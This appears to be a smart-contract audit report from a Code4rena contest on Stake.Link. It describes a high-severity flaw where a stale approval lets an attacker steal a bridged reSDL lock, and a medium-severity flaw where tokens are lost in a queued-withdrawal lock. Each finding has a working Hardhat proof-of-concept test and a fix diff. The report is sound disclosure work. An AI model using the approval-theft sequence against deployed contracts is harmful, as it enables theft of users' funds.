# Stake.Link

**Date:** 22.12.2023-12.01.2024

**Platform:** Code4rena

**Position:** 4 of 53

# Findings summary

| Severity      | Count |
| :---          |  ---: |
| High          | 1 |
| Medium        | 1 |

# Table of Contents

| ID | Title |
| :--- | :--- |
| H-01 | [A user can steal an already transfered and bridged reSDL lock because of approval.](#h-01) |
| M-01 | [A user can lose funds in `sdlPoolSecondary` if tries to add more sdl tokens to a lock that has been queued to be completely withdrawn.](#m-01) |



# High Findings

## <a id="h-01"></a> [H-01] A user can steal an already transfered and bridged reSDL lock because of approval.

## Summary
The reSDL token approval is not deleted when the lock is bridged to an other chain

## Vulnerability Details
When a reSDL token is bridged to an other chain, the `handleOutgoingRESDL()` function is called to make the state changes into the `sdlPool` contract. The function executes the following:

```
    function handleOutgoingRESDL(
        address _sender,
        uint256 _lockId,
        address _sdlReceiver
    )
        external
        onlyCCIPController
        onlyLockOwner(_lockId, _sender)
        updateRewards(_sender)
        updateRewards(ccipController)
        returns (Lock memory)
    {
        Lock memory lock = locks[_lockId];

        delete locks[_lockId].amount;
        delete lockOwners[_lockId];
        balances[_sender] -= 1;

        uint256 totalAmount = lock.amount + lock.boostAmount;
        effectiveBalances[_sender] -= totalAmount;
        effectiveBalances[ccipController] += totalAmount;

        sdlToken.safeTransfer(_sdlReceiver, lock.amount);

        emit OutgoingRESDL(_sender, _lockId);

        return lock;
    }
```
As we can see, it deletes the lock.amount of the lockId, removes the ownership of the lock and decrements the lock balance of the account that is bridging the lock.
The approval that the user had before bridging the reSDL lock will remain there and he can get benefited from it by stealing the NFT.
Consider the following situation:
A user knows that there is a victim that is willing to pay the underlying value for a reSDL lock ownership transfer. What the malicious user can do is set approval to move his lockId in all supported chains to an alt address that he owns. Then, he trades the underlying value for the reSDL ownership and the lock is transfered to the victim/buyer. If the buyer keeps the lock in this chain nothing happens, but if he bridges any of the other supported chains, the malicious user can use the approval of his alt account to steal the reSDL lock.

#### Proof of Concept

<details>

It is written inside `resdl-token-bridge.test.ts` because it uses its setup
```
  it('PoC steal reSDL', async () => {
    let lockId = 2

    let thief = accounts[0]
    let victim = accounts[1]

    let thiefAccount2 = accounts[2]

    let ts = (await ethers.provider.getBlock(await ethers.provider.getBlockNumber())).timestamp

    // Thief approves an alt account that he controls to move his lock in the original chain
    await sdlPool.approve(thiefAccount2, lockId)

    assert.equal(await sdlPool.getApproved(2), thiefAccount2);

    // Thief bridges the lock to an other chain but the approval is not deleted
    await bridge.transferRESDL(77, victim, lockId, true, toEther(10), { value: toEther(10) })
    let lastRequestMsg = await onRamp.getLastRequestMessage()
    assert.deepEqual(
      ethers.utils.defaultAbiCoder
        .decode(
          ['address', 'uint256', 'uint256', 'uint256', 'uint64', 'uint64', 'uint64'],
          lastRequestMsg[1]
        )
        .map((d, i) => {
          if (i == 0) return d
          if (i > 1 && i < 4) return fromEther(d)
          return d.toNumber()
        }),
      [victim, lockId, 1000, 1000, ts, 365 * 86400, 0]
    )
    assert.deepEqual(
      lastRequestMsg[2].map((d) => [d.token, fromEther(d.amount)]),
      [[sdlToken.address, 1000]]
    )
    assert.equal(lastRequestMsg[3], wrappedNative.address)
    assert.equal(lastRequestMsg[4], '0x11')
    await expect(sdlPool.ownerOf(lockId)).to.be.revertedWith('InvalidLockId()')

    // The user that received the lock from bridging on the other chain decides to bridge the lock id
    // back to the original chain
    await offRamp
      .connect(signers[6])
      .executeSingleMessage(
        ethers.utils.formatBytes32String('messageId'),
        77,
        ethers.utils.defaultAbiCoder.encode(
          ['address', 'uint256', 'uint256', 'uint256', 'uint64', 'uint64', 'uint64'],
          [victim, lockId, 1000, 1000, ts, 365 * 86400, 0]
        ),
        sdlPoolCCIPController.address,
        [{ token: sdlToken.address, amount: toEther(25) }]
      )


    // Now the victim owns the reSDL lock on the original chain
    assert.equal(await sdlPool.ownerOf(2), victim)

    // However, this lockId has the approval that originally the thief set to his alt account and victim do not know that
    assert.equal(await sdlPool.getApproved(2), thiefAccount2);

    // Thief transfers back to his main account the reSDL via his alt account
    await sdlPool
      .connect(signers[2])
      .transferFrom(victim, thief, lockId)

    // Thief is now the owner of the reSDL
    assert.equal(await sdlPool.ownerOf(2), thief)
  })
```

</details>

## Impact
High, possibility to steal funds

## Tools Used
Manual review

## Recommendations
When bridging a lock between chains, the lock approval should be deleted.

```diff
     function handleOutgoingRESDL(
         address _sender,
         uint256 _lockId,
         address _sdlReceiver
     )
         external
         onlyCCIPController
         onlyLockOwner(_lockId, _sender)
         updateRewards(_sender)
         updateRewards(ccipController)
         returns (Lock memory)
     {
         Lock memory lock = locks[_lockId];
 
         delete locks[_lockId].amount;
         delete lockOwners[_lockId];
         balances[_sender] -= 1;
+        delete tokenApprovals[_lockId];

         uint256 totalAmount = lock.amount + lock.boostAmount;
         effectiveBalances[_sender] -= totalAmount;
         effectiveBalances[ccipController] += totalAmount;

         sdlToken.safeTransfer(_sdlReceiver, lock.amount);

         emit OutgoingRESDL(_sender, _lockId);

         return lock;
     }
```


## <a id="m-01"></a> [M-01] A user can lose funds in `sdlPoolSecondary` if tries to add more sdl tokens to a lock that has been queued to be completely withdrawn.

## Summary
In a secondary chain, if a user adds more sdl amount into a lock that he has queued to withdraw all the amount in the same index batch, he will lose the extra amount he deposited

## Vulnerability Details
The process to withdraw all the funds from a lock in a primary chain is just by calling withdraw with all the base amount of the lock. At this point the user will get immediately his funds back and the lock will be deleted, hence the owner will be zero address.

However, in a secondary chain, a user has to queue a withdraw of all the funds and wait for the keeper to send the update to the primary chain to execute the updates and then receive his sdl token back. In this period of time when the keeper does not send the update to the primary chain, if a user queues a withdraw of all the lock base amount, he will still own the lock because the withdraw has not been executed, just queued. So the user can still do whatever modification in his lock, for example, increase his lock base amount by calling `transferAndCall()` in the `sdlToken` passing the address of the `sdlSecondaryPool` as argument.

If this happens, when the keeper send the update to the primary chain and the user executes the updates for his lockId, he will lose this extra amount he deposited because it will execute the updates in order, and it will start with the withdraw of all the funds, will delete the ownership (make the zero address as the owner), and then increase the base amount of the lock that now owns the zero address.

And basically the lockId will be owned by the zero address with base amount as the extra sdl tokens that the user sent.

#### Proof of Concept

<details>

It is written inside `sdl-pool-secondary.test.ts` because it uses its setup

```
  it('PoC user will lose extra deposited tokens', async () => {

    let user = accounts[1]
    let initialUserSDLBalance = await sdlToken.balanceOf(user);

    // User creates a lock depositing some amount
    await sdlToken
      .connect(signers[1])
      .transferAndCall(
        sdlPool.address,
        toEther(100),
        ethers.utils.defaultAbiCoder.encode(['uint256', 'uint64'], [0, 0])
      )

    await sdlPool.handleOutgoingUpdate()
    await sdlPool.handleIncomingUpdate(1)
    await sdlPool.connect(signers[1]).executeQueuedOperations([])

    assert.equal(await sdlPool.ownerOf(1), user)
    
    // User queues a withdraw of all the amount from the lock
    await sdlPool.connect(signers[1]).withdraw(1, toEther(100))

    // User wants to deposit more tokens to the lock without the withdraw being updated and still being in the queue
    await sdlToken
      .connect(signers[1])
      .transferAndCall(
        sdlPool.address,
        toEther(1000),
        ethers.utils.defaultAbiCoder.encode(['uint256', 'uint64'], [1, 0])
      )

    await sdlPool.handleOutgoingUpdate()
    await sdlPool.handleIncomingUpdate(2)
    // When executing the updates, zero address will be the owner of his lock
    // and the amount he diposited the last time will be lost
    await sdlPool.connect(signers[1]).executeQueuedOperations([1])

    let finalUserSDLBalance = await sdlToken.balanceOf(user);
    let sdlLost = initialUserSDLBalance.sub(finalUserSDLBalance)

    console.log("The user has lost", sdlLost.toString(), "sdl tokens")

    // This staticall should revert because now the lock owner is the zero address
    await expect(sdlPool.ownerOf(1)).to.be.revertedWith('InvalidLockId()')
  })
```

Output:
```
  SDLPoolSecondary
The user has lost 1000000000000000000000 sdl tokens
    ✔ PoC user is not able to execute his lock updates (159ms)


  1 passing (3s)
```

</details>

## Impact
High, user will lose funds

## Tools Used
Manual review

## Recommendations
When trying to do any action on a lock in a secondary pool, check if the last update queued has not 0 as the base amount. Because if it is the case, that would mean that the user queued a withdraw of all funds and he will lose ownership of the lock at the next keeper update.

```diff
     function _queueLockUpdate(
         address _owner,
         uint256 _lockId,
         uint256 _amount,
         uint64 _lockingDuration
     ) internal onlyLockOwner(_lockId, _owner) {
         Lock memory lock = _getQueuedLockState(_lockId);
+        if(lock.amount == 0) revert();
         LockUpdate memory lockUpdate = LockUpdate(updateBatchIndex, _updateLock(lock, _amount, _lockingDuration));
         queuedLockUpdates[_lockId].push(lockUpdate);
         queuedRESDLSupplyChange +=
             int256(lockUpdate.lock.amount + lockUpdate.lock.boostAmount) -
             int256(lock.amount + lock.boostAmount);
         if (updateNeeded == 0) updateNeeded = 1;

         emit QueueUpdateLock(_owner, _lockId, lockUpdate.lock.amount, lockUpdate.lock.boostAmount, lockUpdate.lock.duration);
     }
```